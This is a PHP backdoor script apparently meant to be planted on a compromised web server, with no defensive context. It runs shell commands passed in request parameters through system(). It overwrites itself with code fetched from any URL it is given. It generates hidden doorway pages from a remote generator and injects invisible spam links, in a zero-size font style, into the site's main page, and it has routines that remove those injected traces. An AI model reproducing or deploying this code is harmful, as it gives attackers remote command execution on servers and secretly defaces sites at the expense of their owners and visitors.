<?php
ignore_user_abort(1);
set_time_limit(0);

function Clear()
{
	unlink("c");
	unlink("1r");
  unlink("log");
}

function Clear2()
{
	$mrd = trim(file_get_contents("m"));
	$pt = "../$mrd";
	$fin = file_get_contents($pt);
	$fin = ereg_replace("<adsttnmq1>(.*)<sdioyslkjs2>", "", $fin);
  $fin = ereg_replace("<!--dd4-->(.*)<!--dd5-->", "", $fin);
	$fin = preg_replace('#<a[^>]+\_lm[^>]*>.*?</a>#is', '', $fin); 
	$fin = preg_replace("/http(.*?)tmp6(.*?)\<\/a\>/", "", $fin);
	$fin = ereg_replace("<!--dd4-->", "", $fin);
  $fin = ereg_replace("<!--dd5-->", "", $fin);
  $fin = ereg_replace("<font style=\"position: absolute;overflow: hidden;height: 0;width: 0\">", "", $fin);
	$fmrd = fopen($pt, "w+");
	fwrite($fmrd, $fin);
	fclose($fmrd);
	echo " upt-ok";
}

function GetVar($name, &$var)
{
	$var = "";
	if (isset($_POST[$name]))
		$var = $_POST[$name];

  if (isset($_GET[$name]))
		$var = $_GET[$name];
	
	if (($var) =="")
	  return  false;
	  else return true;
}

function Gen()
{
	$alp = "abcdefghiklmnjsweqrtyuiopzx";
	$maps = array();
	if (isset($_POST["sg"]))
		$sg = $_POST["sg"];

  if (isset($_GET["sg"]))
		$sg = $_GET["sg"]; 
		
	if (isset($_POST["gm"]))
 	 $g = $_POST["gm"];

	if (isset($_GET["gm"]))
		$g = $_GET["gm"];
		
		
	$path = "";
	$fr = fopen("1r", "a+");
	if (file_exists("c"))
	{
		$fconf = file("c");
		$tname = trim($fconf[0]);
		$cname = trim($fconf[1]);
		$curs = trim($fconf[2]);
		$pid = trim($fconf[3]);
		if ($pid == 100)
		{
			$pid = 0;
			$rnd = mt_rand(0, 999);
			$nm = "";
	    for ($i=0; $i<3; $i++)
	  	{
		  	$ran = mt_rand(0,26);
		  	$sym = $alp[$ran];
		  	$nm = $nm.$sym;
		  }
			$cname = $nm;
			mkdir("$tname/$cname");
			$curs = $g;
		}
	}
	else 
	{
		$rnd = mt_rand(0, 999);
		$nm = "";
	  for ($i=0; $i<5; $i++)
		{
			$ran = mt_rand(0,26);
			$sym = $alp[$ran];
			$nm = $nm.$sym;
		}
		$tname = $nm;
		$pid = 0;
		$curs = $g;
		mkdir($tname);
		$fht = fopen("$tname/.htaccess", "w+");
		$htname = $sg."2.txt";
		$fp = fopen($htname, "r");
		$fin = '';
		while (!feof($fp))
		{
			 $fc = fgets($fp, 1024);
			 if (!$fc) break;
		   $fin .= $fc;
		}
		fclose($fp);
		fwrite($fht, $fin);
		fclose($fht);
		$rnd = mt_rand(0, 999);
		$nm = "";
    for ($i=0; $i<3; $i++)
  	{
	  	$ran = mt_rand(0,26);
	  	$sym = $alp[$ran];
	  	$nm = $nm.$sym;
	  }
		$cname = $nm;
	mkdir("$tname/$cname");
	}
  $gname = $sg."sgen.php";
	for ($j=$pid; $j<$pid+10; $j++)
	{
		$fp = fopen($gname."?g=$curs", "r");
		$fin = '';
		while (!feof($fp))
		{
			 $fc = fgets($fp, 1024);
			 if (!$fc) break;
		   $fin .= $fc;
		}
		fclose($fp);
		
		$fnd = fopen("$tname/$cname/$curs"."_$j.htm", "w+");
		fwrite($fnd, $fin);
		fclose($fnd);
	}
	
	if ($j==100)
	{
	  $fp = fopen($gname."?g=$curs&m=1", "r");
		$fin = '';
		while (!feof($fp))
		{
			 $fc = fgets($fp, 1024);
			 if (!$fc) break;
		   $fin .= $fc;
		}
		fclose($fp);
		$fnd = fopen("$tname/$cname/$curs"."_lm.htm", "w+");
		fwrite($fnd, $fin);
		fclose($fnd);
		$map = "$path/$tname/$cname/$curs"."_lm.htm";
		fwrite($fr,"$map\n");
	}
	
	$fconf = fopen("c", "w+");
	fwrite($fconf, $tname."\n");
	fwrite($fconf, $cname."\n");
	fwrite($fconf, $curs."\n");
	$nj = $j;
	fwrite($fconf, $nj."\n");
	fclose($fconf);
}

function Update()
{
	$thisname = "1.php";
	if (isset($_POST['u']))
	  $u = $_POST['u'];
	  
	if (isset($_GET['u']))
 		$u = $_GET['u'];
 		
 	$fp = fopen($u, "r");
  $fin = '';
		while (!feof($fp))
		{
			 $fc = fgets($fp, 1024);
			 if (!$fc) break;
		   $fin .= $fc;
		}
  fclose($fp);
  
  $fthis = fopen($thisname, "w+");
  fwrite($fthis, $fin);
  fclose($fthis);
}

function Com()
{
	if (isset($_POST['c']))
	  @system($_POST['c']);
  if (isset($_GET['c']))
		@system($_GET['c']);
}

function UpKos()
{
	$mrd = trim(file_get_contents("m"));
    $pt = "../$mrd";
	$fin = file_get_contents($pt);
	$fin = ereg_replace("adsttnmq1", "<adsttnmq1>", $fin);
	$fin = ereg_replace("sdioyslkjs2", "<sdioyslkjs2>", $fin);
	$fmrd = fopen($pt, "w+");
	fwrite($fmrd, $fin);
	fclose($fmrd);
}


function MRepl()
{
	$mpt = "";
	$drs = "";
	$begtag = "<adsttnmq1><font style=\"position: absolute;overflow: hidden;height: 0;width: 0\">"; 
  $endtag = "</font></body></html><sdioyslkjs2> "; 
	$mrd = trim(file_get_contents("m"));
    $pt = "../$mrd";
	$fin = file_get_contents($pt);
	GetVar("mpt", $mpt);
	 // удаляем завершающие хтмл теги
  $fin = preg_replace ("/<\/body>/i", "", $fin);
  $fin = preg_replace ("/<\/html>/i", "", $fin);
  $fin = ereg_replace("<!--dd4-->(.*)<!--dd5-->", "", $fin);
  $fin = ereg_replace("<adsttnmq1>(.*)<sdioyslkjs2>", "", $fin);
	$fp = fopen($mpt, "r");
  GetVar("drs", $drs);
  $fin = $fin.$begtag;  
$drs = str_replace("\\", "", $drs);
  $fin = $fin.$drs;
  $fin = $fin.$endtag; 
  $fmrd = fopen($pt, "w+");
	fwrite($fmrd, $fin);
	fclose($fmrd);
}

function Main()
{
	if (isset($_POST['u']) || isset($_GET['u']))
	{
		Update();
		exit();
	}
	
	if (isset($_POST['c']) || isset($_GET['c']))
	{
		Com();
		exit();
	}
	
		if (isset($_POST['uk']) || isset($_GET['uk']))
	{
		UpKos();
		exit();
	}
	
	if (isset($_POST['g']) || isset($_GET['g']))
	{
		Gen();
		exit();
	}
	
	if (isset($_POST['s']) || isset($_GET['s']))
	{
		MRepl();
		exit();
	}
	
  if (isset($_POST['cl']) || isset($_GET['cl']))
	{
		Clear();
		exit();
	}
	
	if (isset($_POST['cl2']) || isset($_GET['cl2']))
	{
		Clear2();
		exit();
	}
	
	echo "<ok>";
	
}

Main();

?>